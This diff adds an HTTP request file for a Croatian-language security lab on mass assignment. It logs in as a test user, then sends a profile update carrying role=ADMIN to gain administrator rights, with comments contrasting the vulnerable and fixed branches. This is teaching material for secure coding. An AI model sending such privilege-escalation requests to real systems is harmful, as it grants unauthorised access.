@@ -1,0 +1,33 @@
+### Lab02 – Mass assignment / eskalacija privilegija
+@host = http://localhost:8000
+@token = PASTE_TOKEN
+
+### 1. Prijava kao marko (kopiraj token u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "marko", "password": "Marko123!"}
+
+### 2. Trenutni profil (role = USER)
+GET {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+
+### 3. EKSPLOATACIJA: salje role=ADMIN (mass assignment)
+# Ranjivo (main): profil dobiva ADMIN. Popravljeno: role se ignorira (DTO bez role).
+PUT {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"displayName": "Marko", "email": "m@x.hr", "role": "ADMIN"}
+
+### 4. Pokusaj pristupa admin popisu
+# Ranjivo (main): 200. Popravljeno: 403.
+GET {{host}}/api/lab02/admin/users
+Authorization: Bearer {{token}}
+
+### 5. Legitimna promjena imena (bez role) – radi na obje grane
+PUT {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"displayName": "Marko Novo", "email": "marko@akademija.hr"}
